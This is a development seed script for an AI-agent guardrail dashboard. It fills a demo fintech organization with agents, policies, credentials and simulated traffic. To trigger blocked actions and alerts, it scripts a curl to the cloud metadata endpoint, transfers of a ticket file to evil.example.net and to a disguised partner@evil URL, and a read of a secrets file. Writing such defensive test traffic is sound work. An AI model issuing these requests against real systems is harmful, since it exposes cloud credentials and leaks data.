/**
 * Development-only showcase data: a realistic-looking organization with several agents, a week of traffic,
 * approvals in every state, alerts and observations. EVERYTHING is generated through the real API in-process and
 * labelled `demo: true`, so the dashboard marks it "Demonstration". Timestamps are then spread over the last 7 days.
 *
 *   npm run seed        (stop the server first: the embedded dev database allows one process)
 */
import { createApp } from "../src/server/app.js";
import { loadConfig } from "../src/server/config.js";
import { createDb } from "../src/server/db.js";
import { runMigrations } from "../src/server/migrate.js";
import { setLogLevel } from "../src/server/log.js";
import { GuardianClient, ProtectedExecutor } from "../src/sdk/index.js";
import { POLICY_EXAMPLES } from "../src/shared/policy.js";
import { createWorkspace } from "./workspace.js";

const config = loadConfig({ ...process.env, LOG_LEVEL: "error" } as NodeJS.ProcessEnv);
if (config.NODE_ENV === "production") throw new Error("Refusing to seed in production");
setLogLevel("error");
const db = await createDb(config);
await runMigrations(db);
const app = createApp({ db, config }, { ipLimitsMultiplier: 1000 });
const inProc = ((url: string, init: RequestInit) => app.request(new URL(url).pathname + new URL(url).search, init)) as unknown as typeof fetch;

class Person {
  cookie = "";
  constructor(public email: string, public name: string, public password = "guardian-showcase-2026") {}
  async call(method: string, path: string, body?: unknown) {
    const res = await app.request(path, { method, headers: { "content-type": "application/json", "x-asg-csrf": "1", ...(this.cookie ? { cookie: this.cookie } : {}) }, body: body === undefined ? undefined : JSON.stringify(body) });
    const set = res.headers.get("set-cookie");
    if (set) this.cookie = set.split(";")[0];
    const j = await res.json().catch(() => null);
    if (!res.ok) throw new Error(`${method} ${path} ${res.status} ${JSON.stringify(j?.error)}`);
    return j;
  }
  async join() {
    await this.call("POST", "/api/auth/register", { email: this.email, name: this.name, password: this.password }).catch(() => undefined);
    await this.call("POST", "/api/auth/login", { email: this.email, password: this.password });
  }
}

const existing = await db.query("SELECT 1 FROM users WHERE email = 'kwame@accrafintech.example'");
if (existing.length) {
  console.log("Showcase data already present. Delete .data/ to start fresh.");
  await db.close();
  process.exit(0);
}

const owner = new Person("kwame@accrafintech.example", "Kwame Mensah");
const admin = new Person("abena@accrafintech.example", "Abena Osei");
const viewer = new Person("yaw@accrafintech.example", "Yaw Boateng");
for (const p of [owner, admin, viewer]) await p.join();
const org = await owner.call("POST", "/api/orgs", { name: "Accra Fintech Ltd" });
await owner.call("POST", `/api/orgs/${org.id}/members`, { email: admin.email, role: "admin" });
await owner.call("POST", `/api/orgs/${org.id}/members`, { email: viewer.email, role: "viewer" });
const base = `/api/orgs/${org.id}`;
const ex = (k: string) => POLICY_EXAMPLES.find((e) => e.key === k)!;

const pol = async (name: string, key: string, description: string) => (await owner.call("POST", `${base}/policies`, { name, description, document: ex(key).document })).id as string;
const pSupport = await pol("Support assistant", "demo-workspace", "Reads the knowledge base, writes summaries, deletes need approval, one partner destination.");
const pInvoice = await pol("Invoice assistant", "destructive-needs-approval", "Reads and updates invoices; deletes need administrator approval.");
const pExport = await pol("Report exporter", "approved-destinations", "May send reports only to approved partner domains.");
const pReadonly = await pol("Read-only analyst", "read-only-assistant", "Strictly read-only.");
// a second version of one policy, so version history is real
await owner.call("PUT", `${base}/policies/${pReadonly}`, { document: { ...ex("read-only-assistant").document, description: "Strictly read-only (tightened to docs/** only)." } });

const mkAgent = async (name: string, description: string, environment: string, integration_type: string, policy_id: string | null, enforcement_mode = "enforce") =>
  (await owner.call("POST", `${base}/agents`, { name, description, environment, integration_type, policy_id, enforcement_mode })).id as string;
const aSupport = await mkAgent("support-summarizer", "Summarizes customer tickets for the support team.", "production", "typescript_sdk", pSupport);
const aInvoice = await mkAgent("invoice-assistant", "Drafts and corrects supplier invoices.", "production", "typescript_sdk", pInvoice);
const aExport = await mkAgent("report-exporter", "Sends monthly reports to partners. Being trialled in monitor mode.", "staging", "typescript_sdk", pExport, "monitor");
const aCrm = await mkAgent("crm-sync-observer", "Reports CRM tool usage. Event reporting only: cannot be blocked.", "development", "event_reporting", null);
const aLegacy = await mkAgent("legacy-helpdesk-bot", "Retired helpdesk bot.", "production", "typescript_sdk", pReadonly);
await mkAgent("new-hire-onboarder", "Registered but not yet connected.", "development", "typescript_sdk", pReadonly);

const key = async (agent: string, name: string) => (await owner.call("POST", `${base}/credentials`, { agent_id: agent, name })).secret as string;
const kSupport = await key(aSupport, "production server");
const kInvoice = await key(aInvoice, "production server");
const kExport = await key(aExport, "staging worker");
const kCrm = await key(aCrm, "crm webhook");
const kLegacy = await key(aLegacy, "legacy key");

const ws = createWorkspace();
for (const f of ["docs/policy.txt", "docs/faq.txt", "docs/ticket-4821.txt", "docs/ticket-4822.txt", "docs/refund-rules.txt", "invoices/INV-1001.txt", "invoices/INV-1002.txt", "invoices/INV-1003.txt", "invoices/INV-1004.txt"]) {
  ws.handlers.documents({ tool: "documents", operation: "create", resource: f, args: { text: "DEMO FIXTURE" } }, { requestId: "seed", destinationHost: null }).catch(() => undefined);
}
await new Promise((r) => setTimeout(r, 200));
const client = (k: string) => new GuardianClient({ baseUrl: "http://seed", apiKey: k, fetch: inProc, demo: true, maxRetries: 0 });
const flaky = { documents: async (a: any, c: any) => { if (a.resource === "invoices/INV-1003.txt" && a.operation === "update") throw new Error("storage timeout"); return ws.handlers.documents(a, c); }, transfer: ws.handlers.transfer, shell: ws.handlers.shell };
const support = new ProtectedExecutor(client(kSupport), ws.handlers);
const invoice = new ProtectedExecutor(client(kInvoice), flaky);
const exporter = new ProtectedExecutor(client(kExport), ws.handlers);

const pick = <T,>(a: T[]) => a[Math.floor(Math.random() * a.length)];
const docs = ["docs/policy.txt", "docs/faq.txt", "docs/ticket-4821.txt", "docs/ticket-4822.txt", "docs/refund-rules.txt"];
let n = 0;
const uniq = () => `seed_${Date.now().toString(36)}_${n++}`;

for (let i = 0; i < 38; i++) await support.run({ requestId: uniq() + "_r", tool: "documents", operation: "read", resource: pick(docs) });
for (let i = 0; i < 14; i++) await support.run({ requestId: uniq() + "_c", tool: "documents", operation: "create", resource: `summaries/summary-${i}-${Date.now().toString(36)}.txt`, args: { text: "Summary text" } });
for (const [op, res] of [["delete", "reports/q3-final.txt"], ["update", "docs/policy.txt"], ["delete", "summaries/old.txt"], ["read", "secrets/keys.txt"]] as const)
  await support.run({ requestId: uniq() + "_d", tool: "documents", operation: op, resource: res });
for (let i = 0; i < 3; i++) await support.run({ requestId: uniq() + "_x", tool: "shell", operation: "command_execution", resource: "host/shell", args: { command: "curl http://169.254.169.254/latest/meta-data/" } });
for (const d of ["https://files.evil.example.net/up", "http://169.254.169.254/", "https://partner.example.com@evil.example.net/x"])
  await support.run({ requestId: uniq() + "_t", tool: "transfer", operation: "external_transfer", resource: "docs/ticket-4821.txt", data_classification: "internal", destination: d, args: { source: "docs/ticket-4821.txt" } });
for (let i = 0; i < 3; i++) await support.run({ requestId: uniq() + "_t", tool: "transfer", operation: "external_transfer", resource: "docs/faq.txt", data_classification: "internal", destination: "https://partner.example.com/inbox", args: { source: "docs/faq.txt" } });

for (const f of ["INV-1001", "INV-1002", "INV-1003", "INV-1004"]) await invoice.run({ requestId: uniq() + "_ir", tool: "documents", operation: "read", resource: `docs/../invoices/${f}.txt`.replace("docs/../", "") });
for (const f of ["INV-1001", "INV-1003"]) await invoice.run({ requestId: uniq() + "_iu", tool: "documents", operation: "update", resource: `docs/${f}.txt`, args: { text: "corrected" } });
// approvals in every state
const pendingIds: string[] = [];
for (const f of ["INV-1001", "INV-1002", "INV-1003", "INV-1004"]) {
  const id = uniq() + "_id";
  pendingIds.push(id);
  await invoice.run({ requestId: id, tool: "documents", operation: "delete", resource: `invoices/${f}.txt` });
}
const list = await admin.call("GET", `${base}/approvals?status=pending`);
const byRes = (r: string) => list.items.find((a: any) => a.resource === r);
await admin.call("POST", `${base}/approvals/${byRes("invoices/INV-1001.txt").id}/approve`, { note: "Duplicate invoice, confirmed with finance." });
await admin.call("POST", `${base}/approvals/${byRes("invoices/INV-1002.txt").id}/reject`, { note: "Needed for the audit." });
await invoice.run({ requestId: pendingIds[0], tool: "documents", operation: "delete", resource: "invoices/INV-1001.txt" }); // executes once
// INV-1003, INV-1004 stay pending

for (let i = 0; i < 9; i++) await exporter.run({ requestId: uniq() + "_er", tool: "transfer", operation: "external_transfer", resource: "docs/refund-rules.txt", data_classification: "internal", destination: i % 3 === 0 ? "https://analytics.unknown-vendor.test/ingest" : "https://partner.example.com/inbox", args: { source: "docs/refund-rules.txt" } });

const crm = client(kCrm);
for (let i = 0; i < 22; i++) await crm.sendEvent({ event_id: uniq() + "_ev", event_type: pick(["tool_call", "tool_call", "tool_result", "error"]), tool: pick(["crm", "email", "calendar"]), operation: pick(["read", "update", "create"]), resource: `contacts/${1000 + i}`, summary: { records: i % 5 } });

await support.run({ tool: "documents", operation: "read", resource: "docs/faq.txt" });
await client(kLegacy).whoami().catch(() => undefined);
await owner.call("POST", `${base}/agents/${aLegacy}/revoke`);
await client(kLegacy).whoami().catch(() => undefined); // revoked use: alert

// spread the history over the last 7 days (timestamps only; relationships untouched)
await db.exec(`
  UPDATE action_requests SET created_at = now() - (random() * interval '7 days') - interval '3 minutes' WHERE org_id = '${org.id}';
  UPDATE authorization_decisions d SET created_at = a.created_at, expires_at = a.created_at + interval '5 minutes' FROM action_requests a WHERE a.id = d.action_request_id AND d.org_id = '${org.id}';
  UPDATE execution_outcomes o SET created_at = a.created_at + interval '2 seconds', claimed_at = CASE WHEN o.claimed_at IS NULL THEN NULL ELSE a.created_at + interval '1 second' END, reported_at = CASE WHEN o.reported_at IS NULL THEN NULL ELSE a.created_at + interval '2 seconds' END FROM action_requests a WHERE a.id = o.action_request_id AND o.org_id = '${org.id}';
  UPDATE observed_events SET created_at = now() - (random() * interval '7 days') WHERE org_id = '${org.id}';
  UPDATE alerts SET created_at = now() - (random() * interval '3 days'), last_seen_at = now() - (random() * interval '2 days') WHERE org_id = '${org.id}';
  UPDATE agents SET created_at = now() - interval '9 days' WHERE org_id = '${org.id}';
`);
// keep pending approvals genuinely pending/fresh and the latest activity recent
await db.exec(`
  UPDATE action_requests a SET created_at = now() - interval '40 minutes' FROM approvals p WHERE p.action_request_id = a.id AND p.status = 'pending' AND a.org_id = '${org.id}';
  UPDATE authorization_decisions d SET created_at = now() - interval '40 minutes' FROM approvals p WHERE p.action_request_id = d.action_request_id AND p.status = 'pending' AND d.org_id = '${org.id}';
  UPDATE approvals SET requested_at = now() - interval '40 minutes', expires_at = now() + interval '20 hours' WHERE status = 'pending' AND org_id = '${org.id}';
  UPDATE agents SET last_seen_at = now() - interval '2 minutes' WHERE id IN ('${aSupport}', '${aInvoice}') ;
  UPDATE agents SET last_seen_at = now() - interval '6 minutes' WHERE id = '${aCrm}';
  UPDATE agents SET last_seen_at = now() - interval '3 hours' WHERE id = '${aExport}';
`);

console.log("\nShowcase organization ready: Accra Fintech Ltd");
for (const p of [owner, admin, viewer]) console.log(`  ${p.name.padEnd(14)} ${p.email}  /  ${p.password}`);
ws.cleanup();
await db.close();
